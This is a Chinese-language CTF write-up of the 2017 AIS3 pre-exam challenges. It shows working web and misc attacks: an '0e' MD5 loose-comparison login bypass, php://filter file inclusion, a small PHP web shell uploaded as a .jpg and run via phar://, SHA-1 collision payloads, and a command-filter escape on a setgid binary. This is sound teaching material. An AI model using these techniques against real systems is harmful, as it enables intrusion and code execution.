---
title: "Writeups #1: 2017-AIS3-pre-exam"
tags:
  - CTF
  - writeups
categories: Writeups
date: 2017-07-15 23:19:11
---


|Web|Crypto|Rev|Misc|
|:--:|:--:|:--:|:--:|
|[Web 1](#web1)|[Crypto 1](#crypto1)|[Rev 1](#rev1)|[Misc 2](#misc2)|
|[Web 2](#web2)|[Crypto 3](#crypto3)||[Misc 4](#misc4)|
|[Web 3](#web3)|
|[Web 4](#web4)|


<!--more-->

<h2 id="misc2">Misc 2</h2>

一開始說
```
I've sent you something :)
```

response

```
HereItIs: "Uzc0RzMyLnBocA=="
```

base64 decode: S74G32.php

Hint: Pikachu likes the color yellow. Do you know what to do now?

把背景顏色改成黃色

```java
bgcolor="yellow"
```

get

```
AIS3{pika}
```

<h2 id="web1">Web 1</h2>

http status: 304 Not Modified

quiz.ais3.org:42351 一直被重新導向至 quiz.ais3.org:42351/index.html

```
$ curl -i https://quiz.ais3.org:42351
```

get

```
AIS3{As_Simple_As_Usual}
```

<h2 id="web2">Web 2</h2>

```php
<?php
include("flag.php");
if (isset($_GET["source"])) {
    show_source(__FILE__);
    exit();
}
$db = array(
    array("username" => "delicia", "password" => "6d386d56781b744d31328faace811444"),
    array("username" => "earnest", "password" => "907d82744bb98e956f82077a20cf92d3"),
    array("username" => "chaya", "password" => "0c914720b899f04c3522a6a467d23e07"),
    array("username" => "carlos", "password" => "4a84296507efdac241f300b4676c8448"),
    array("username" => "celine", "password" => "b74f357a8ef07a954ef3c2b780f09309"),
    array("username" => "trena", "password" => "d8a7a3e0bee98a1315f1ebeb8a6cabe5"),
    array("username" => "otis", "password" => "ca3ace395c61849f13b0a12e939ba101"),
    array("username" => "kristyn", "password" => "467bbf3d08f6d7b46a169257d2f1190a"),
    array("username" => "meaghan", "password" => "df70b80ddd44e63bc5f4eb3c4f920e77"),
    array("username" => "lacresha", "password" => "aaef40f431754fbec001172f0ce714b9"),
    array("username" => "alleen", "password" => "6d8fdad086cee23270c45a06362d03e8"),
    array("username" => "marketta", "password" => "50da5753695a6ba0514bb38d351cae81"),
    array("username" => "charlette", "password" => "3b10f46067c305ba6a10d9d3ca68e56c"),
    array("username" => "golda", "password" => "05615438bb05818cf11abb7c4bc12033"),
    array("username" => "miki", "password" => "e99a9c9124c6b4e8a7d114c95106cbb1"),
    array("username" => "adelaide", "password" => "6197a1a44aac59234fab3c7fdc872b64"),
    array("username" => "yung", "password" => "06418dc6dad833585d54e81b340c0a99"),
    array("username" => "delcie", "password" => "5f1bc54558e89ad5078ffb56bda5f86b"),
    array("username" => "alisia", "password" => "ddc21c265a7536dcf6854f5fd744b2a2"),
    array("username" => "vicki", "password" => "6bf94c6f0f5a6fac2c6859bebe2de44f"),
    array("username" => "jarrod", "password" => "6f0b8474de3252bfda8177c7f81f5bc8"),
    array("username" => "liberty", "password" => "64b73e2569bb43e6d80fffa90327e5d6"),
    array("username" => "dani", "password" => "f8aa590cb16d8746d2530f2d6b082e88"),
    array("username" => "dillon", "password" => "cb2277c9f695cd4c4d8453b531329c69"),
    array("username" => "quinton", "password" => "e322aae4dd7de048f8a5827874dcaa9b"),
    array("username" => "caridad", "password" => "edf4bcb49c1bc2e0aa720ad25978de70"),
    array("username" => "lucas", "password" => "a551c048a50263748a98a3a914da202d"),
    array("username" => "sena", "password" => "0e959146861158620914280512624073"),
    array("username" => "deja", "password" => "590aea8ba65098dccb7ee6835039f949"),
    array("username" => "fiona", "password" => "8c15dd1dcd59386d2a813eaa9ac01945"),
    array("username" => "mechelle", "password" => "ca8087d12f12a9442e1c59942173fa58"),
    array("username" => "an", "password" => "cf0d72a68a70e78f78b4b97d0fef7d89"),
    array("username" => "chadwick", "password" => "e564ee0a33eedb3cb99a8fa363ff3d39"),
    array("username" => "sandi", "password" => "8f92e127efcd049303431724661cc51a"),
    array("username" => "leola", "password" => "aa01b9fa4db785a7a4422b069a0777dd"),
    array("username" => "enid", "password" => "881592be42a22ae1011ff21bd8da57f9"),
    array("username" => "dewitt", "password" => "35646ebd5bb1bdeb05a9989cd4e2317a"),
    array("username" => "tamala", "password" => "9e2932b9be2ce2fbe6679c704fa32370"),
    array("username" => "madelaine", "password" => "ae9608b773317fb14776a1f03004ed3f"),
    array("username" => "ivan", "password" => "2bc7fce377c6a9568afa03d92c902cd7"),
    array("username" => "demetrius", "password" => "bbb3778c0359cdb6ea78a9a184396fde"),
    array("username" => "nevada", "password" => "a443c85070f9b92c6639f63bf46cf465"),
    array("username" => "lawanda", "password" => "04680fefd56ef0b2606e8df32ca7e578"),
    array("username" => "nancee", "password" => "9e1bc7ff8116dbb522a1399ef9fbca2a"),
    array("username" => "alexia", "password" => "5699f2844f7e41da9cf98aed003be6dd"),
    array("username" => "porsha", "password" => "4f38dcc1120d8824de4db6d20c892072"),
    array("username" => "edda", "password" => "fe5cc1e65c1e34046d34b6fd325729b6"),
    array("username" => "lucy", "password" => "fda2dc38e34f89e3018483fb25d7c471"),
    array("username" => "gilbert", "password" => "54ea997a290c9b00f918aa5078f8afa1"),
    array("username" => "tamica", "password" => "7a210fab1fda43d6ab88db77a43ef2f2")
);
$msg = "";
if (isset($_POST["username"]) and isset($_POST["password"]))
{
    $username = (string)$_POST["username"];
    $password = (string)$_POST["password"];
    $success = false;
    foreach ($db as $row)
    {
        if ($username == $row["username"] and md5($password) == $row["password"])
        {
            $msg = "Successful login as $username. Here's your flag: ".$flag;
            $success = true;
            break;
        }
    }
    if (!$success)
    {
        $msg = "Invalid username or password.";
    }
}
?>
```

他的判斷是 `==`

找 0e 開頭的 md5，利用科學記號的關係，判斷時會變成 0 = 0

```php
array("username" => "sena", "password" => "0e959146861158620914280512624073")
```

s1091221200a (md5 => 0e940624217856561557816327384675)

```
AIS3{Hey!Why_can_you_login_without_the_password???}
```

<h2 id="web3">Web 3</h2>

因為 about 的 url: quiz.ais3.org:23545/?p=about

讓我想到 [Using php://filter for local file inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

```
/?p=php://filter/convert.base64-encode/resource=index
```

get

```
PD9waHAKLy8gZmxhZzE6IEFJUzN7Q3V0ZV9Tbm9vcHlfaXNfYmFjayEhPyE/ISE/fQoKCi8vIGRpc2FibGVkIGZvciBzZWN1cml0eSBpc3N1ZQokYmxhY2tsaXN0ID0gWyJodHRwIiwgImZ0cCIsICJkYXRhIiwgInppcCJdOwpmb3JlYWNoICgkYmxhY2tsaXN0IGFzICYkcykKICAgIHN0cmVhbV93cmFwcGVyX3VucmVnaXN0ZXIoJHMpOwoKJEZST01fSU5DTFVERSA9IHRydWU7CgokcGFnZXMgPSBhcnJheSgKICAgIC8vIGRpc2FibGVkCiAgICAvLyAidXBsb2FkZGRkZGRkIiA9PiAiVXBsb2FkcyIsCiAgICAiYWJvdXQiID0+ICJBYm91dCIKKTsKCmlmIChpc3NldCgkX0dFVFsicCJdKSkKICAgICRwID0gJF9HRVRbInAiXTsKZWxzZQogICAgJHAgPSAiaG9tZSI7CgoKaWYoc3RybGVuKCRwKSA+IDEwMCkKewogICAgZGllKCJwYXJhbWV0ZXIgaXMgdG9vIGxvbmciKTsKfQoKPz4KCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cjw/cGhwCmluY2x1ZGUgImhlYWRlci5waHAiOwppbmNsdWRlICRwIC4gIi5waHAiOwo/Pgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogICAgPHA+wqkgY2VicnVzZnMgMjAxNzwvcD4KPC9mb290ZXI+CjwvYm9keT4KPC9odG1sPgo=

```

base64 decode

```php
<?php
// flag1: AIS3{Cute_Snoopy_is_back!!?!?!!?}
// disabled for security issue
$blacklist = ["http", "ftp", "data", "zip"];
foreach ($blacklist as &$s)
    stream_wrapper_unregister($s);
$FROM_INCLUDE = true;
```

<h2 id="rev1">Rev 1</h2>

用 OllyDBG

F2 下斷點，F8 執行

```
AIS3{h0w d1d y0u s3e it}
```

<h2 id="web4">Web 4</h2>

```
/?p=php://filter/convert.base64-encode/resource=index
```

```php
<?php
// flag1: AIS3{Cute_Snoopy_is_back!!?!?!!?}
// disabled for security issue
$blacklist = ["http", "ftp", "data", "zip"];
foreach ($blacklist as &$s)
    stream_wrapper_unregister($s);
$FROM_INCLUDE = true;
$pages = array(
    // disabled
    // "uploaddddddd" => "Uploads",
    "about" => "About"
);
if (isset($_GET["p"]))
    $p = $_GET["p"];
else
    $p = "home";
```

訪問 quiz.ais3.org:23545/?p=uploaddddddd

只能上傳 .jpg

[寫的蠻清楚的 writeups](https://0x1337seichi.wordpress.com/2015/03/15/codgate-2015-ctf-quals-owlur-writeup-web-200/)

http://php.net/manual/fr/wrappers.php

```php
<?php

print_r(shell_exec('ls'));

?>
```

包成 zip，把檔名加上 .jpg

上傳後 quiz.ais3.org:23545/images/140.118.149.167/oXSrrTVq1.jpg

利用 phar:// — Archive PHP

訪問 quiz.ais3.org:23545/?p=phar://images/140.118.149.167/oXSrrTVq1.jpg/untitled

```
about.php css header.php home.php images img index.php js the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l uploaddddddd.php
```
有個檔案
```
the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l
```

訪問 quiz.ais3.org:23545/the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l

```
AIS3{RCEEEEEEEEE_is_soooooooooo_funnnnnnnnnnnn!?!!?!!!}
```

<h2 id="Crypto1">Crypto 1</h2>

```c
#include <stdio.h>
#include <string.h>
int main()
{
	int val1 = ?????????, val2 = ?????????, val3 = ???????, val4 = ??????, i, *ptr;
	char flag[29] = "????????????????????????????"; // Hint: The flag begins with AIS3

	for(i = 0, ptr = (int*)flag ; i < 7 ; ++i)
		printf("%d\n", ptr[i] ^ val1 ^ val2 ^ val3 ^ val4);

	/*
	964600246
	1376627084
	1208859320
	1482862807
	1326295511
	1181531558
	2003814564
	*/

	return 0;
}
```

提示說開頭是 AIS3

所以 AIS3 轉成 int 後跟 val1, val2, val3, val4 做 xor 會是 964600246

經由大大提點

```python
import sys
crypto_list = [964600246, 1376627084, 1208859320, 1482862807, 1326295511, 1181531558, 2003814564]
xor = int('AIS3'[::-1].encode('hex'), 16) ^ crypto_list[0]
print 'xor: ', xor
flag = ''
for key in crypto_list:
	print hex(key ^ xor)
```

（其實這邊我不知道為何 AIS3 要反轉）

```
xor:  170780919
0x33534941
0x5820417b
0x4220524f
0x524f5820
0x45204120
0x4c415551
0x7d422053
```

轉成 ASCII

```
3SIAX A{B ROROX E A LAUQ}B S
```

AIS3 字串反了，我是土法煉鋼手動把十六進位反轉回來

```
0x41495333
0x7b412058
0x4f522042
0x20584f52
0x20412045
0x5155414c
0x5320427d
```

轉成 ASCII

```
AIS3{A XOR B XOR A EQUALS B}
```

<h2 id="crypto3">Crypto 3</h2>

```php
<?php
include("flag.php");
if (isset($_GET["source"])) {
    show_source(__FILE__);
    exit();
}
function startsWith($haystack, $needle)
{
    $length = strlen($needle);
    return (substr($haystack, 0, $length) === $needle);
}
if (isset($_POST["username"]) and isset($_POST["password"]))
{
    $username = (string)$_POST["username"];
    $password = (string)$_POST["password"];
    $h1 = sha1($username);
    $h2 = sha1($password);
    if ($username == $password)
    {
        $msg = "Your password can not be your username.";
    }
    else if ($h1 === $h2)
    {
        $msg = "Flag1: $flag1";
        if (strpos($username, "Snoopy_do_not_like_cats_hahahaha") !== false and
            strpos($password, "ddaa_is_PHD") !== false and
            startsWith($h1, "f00d"))
        {
            $msg .= "</br>";
            $msg .= "Flag2: $flag2";
        }
    }
    else
    {
        $msg = "Invalid password.";
    }
}
?>
```

就是要讓 SHA1 collision

這個網站 https://shattered.io/ 的兩個 PDF 檔已經被證實有發生 SHA1 collision

[寫得蠻詳細的 writeup](http://blog.csdn.net/caiqiiqi/article/details/68953730)

先找出兩份文件的不同處

```
$ cmp -l shattered-1.pdf shattered-2.pdf
```

用 `xxd` 把 pdf 的文件資訊轉成十六進位表示

```
$ xxd shattered-1.pdf > shattered-1.pdf.hex
$ xxd shattered-2.pdf > shattered-2.pdf.hex
```

用 `colordiff` 比較

```
$ brew install colordiff
$ colordiff shattered-1.pdf.hex shattered-2.pdf.hex
```

{% asset_img slug 2017-07-07-1.png %}

用 python 將兩份文件不同的地方轉成 url encode

{% asset_img slug 2017-07-07-2.png %}

用 HackBar 送

```
username=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
```

```
AIS3{SHA1111l111111_is_broken}
```

<h2 id="misc4">Misc 4</h2>

```
ssh://misc4@quiz.ais3.org :31534/
(login password is ais3)
```

有三個檔案

```
flag  shell  shell.c
```

直接用 cat flag 會 Permission denied

```
dr-xr-xr-x 2 root root   4096 Jun 24 17:25 .
drwx--x--x 5 root root   4096 Jun 26 14:38 ..
-rw-r--r-- 1 root root      0 Jun 24 17:25 .hushlogin
-r--r----- 1 root misc4x   32 Jun 24 16:01 flag
-r-xr-s--x 1 root misc4x 9160 Jun 24 17:02 shell
-r--r--r-- 1 root misc4x  686 Jun 24 17:02 shell.c
```

[Linux 檔案與目錄的特殊權限](http://www.bestlong.idv.tw/thread-225-1-1.html)

> s 或 S（SUID,Set UID）：
> 可執行的文件搭配這個權限，便能得到特權，任意存取該文件的所有者能使用的全部系統資源。請注意具備 SUID 權限的文件，黑客經常利用這種權限，以 SUID 配上 root 帳號擁有者，無聲無息的在系統中開啟後門，供日後進出使用。

所以要透過執行 shell 讓它顯示 flag

shell.c

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "\\")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}
extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}
int main(int argc, char* argv[], char** envp){
        setregid(getegid(), -1);
        if(argc < 2) { return 0; }
        delete_env();
        putenv("PATH=/this_is_not_a_valid_path");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

類似這題 https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2/cmd2.md

先回到根目錄，利用根目錄的 `pwd=/`，再用 cat 將檔案顯示出來

```
$ ./shell "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)misc4\$(pwd)*"
```

```
ais3{I_AM_NOT_FAMALIAR_WITH_IT}
```
